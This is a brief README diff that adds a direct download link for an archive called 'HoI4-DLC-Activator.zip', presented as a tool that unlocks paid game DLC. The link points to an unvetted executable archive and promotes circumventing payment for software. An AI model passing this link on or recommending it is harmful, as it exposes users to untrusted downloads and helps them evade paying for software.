@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.1+ Release]() = `*Tool files & folder*`
+- [💾 v.1.1+ Release](https://github.com/HoI4-DLC-Unlocker/.github/releases/download/v.115/HoI4-DLC-Activator.zip) = `*Tool files & folder*`
 
 ---
 
